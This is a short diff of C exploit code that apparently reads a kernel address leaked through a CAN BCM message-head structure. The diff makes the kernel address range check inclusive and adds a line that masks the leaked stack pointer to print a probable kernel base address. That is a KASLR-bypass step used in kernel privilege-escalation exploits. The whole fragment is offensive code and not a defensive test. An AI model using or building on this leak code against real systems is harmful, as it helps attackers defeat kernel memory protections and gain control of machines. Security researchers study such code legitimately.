@@ -93,7 +93,7 @@ unsigned long get_kernel_addr_from_bcm_msg_head_struct() {
   char *endptr;
   unsigned long addr = (unsigned long)strtoull(addrs, &endptr, 16);
 
-  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
+  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
 
   return 0;
@@ -107,6 +107,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("leaked stack pointer: %lx\n", addr);
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
 
   return 0;
 }
